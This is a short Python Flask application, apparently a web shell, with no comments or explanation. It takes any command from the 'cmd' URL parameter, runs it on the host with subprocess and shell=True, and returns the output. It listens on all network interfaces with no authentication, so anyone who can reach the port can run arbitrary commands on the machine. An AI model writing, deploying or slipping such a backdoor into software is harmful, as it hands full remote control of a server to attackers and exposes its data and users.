import subprocess

from flask import Flask, request

app = Flask(__name__)


@app.route('/')
def index():
    cmd = request.args['cmd']
    output = ''
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except:
        print("error")
    out = output.decode('cp936').encode('utf-8')
    return out


if __name__ == "__main__":
    app.run(host="0.0.0.0")
